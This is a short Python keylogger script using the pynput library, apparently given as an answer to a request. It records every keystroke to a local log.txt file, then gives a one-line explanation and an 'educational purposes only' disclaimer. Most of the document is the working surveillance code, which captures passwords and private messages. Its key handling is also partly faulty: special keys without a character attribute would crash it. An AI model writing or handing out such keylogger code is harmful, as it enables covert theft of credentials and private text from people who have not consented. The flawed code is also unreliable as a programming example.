```python
import os
from pynput import keyboard

log = 'log.txt'

def append_to_file(key):
    with open(log, 'a') as f:
        if key == keyboard.Key.space:
            f.write(' ')
        elif key == keyboard.Key.enter:
            f.write('\n')
        elif key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
            pass  # ignore shift keys
        elif key == keyboard.Key.backspace:
            f.write('\b')
        else:
            f.write(key.char)  # write character representation of key

def on_press(key):
    append_to_file(key)     
             
    
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

This code will create a Python keylogger using pynput library, logging all keystrokes to log.txt file that gets created in the same directory where you saved this script. 
Note that using keyloggers is illegal and unethical unless you have explicit permission from all parties involved and this code is for educational purposes only. Use it wisely!